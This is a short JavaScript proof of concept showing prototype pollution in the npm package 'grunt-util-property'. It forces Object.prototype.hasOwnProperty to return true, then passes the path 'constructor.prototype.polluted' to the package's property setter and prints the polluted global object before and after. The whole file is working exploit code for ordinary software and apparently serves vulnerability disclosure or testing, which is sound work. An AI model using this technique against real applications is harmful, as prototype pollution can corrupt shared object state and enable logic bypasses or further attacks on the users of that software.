Object.prototype.hasOwnProperty = () => true;
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);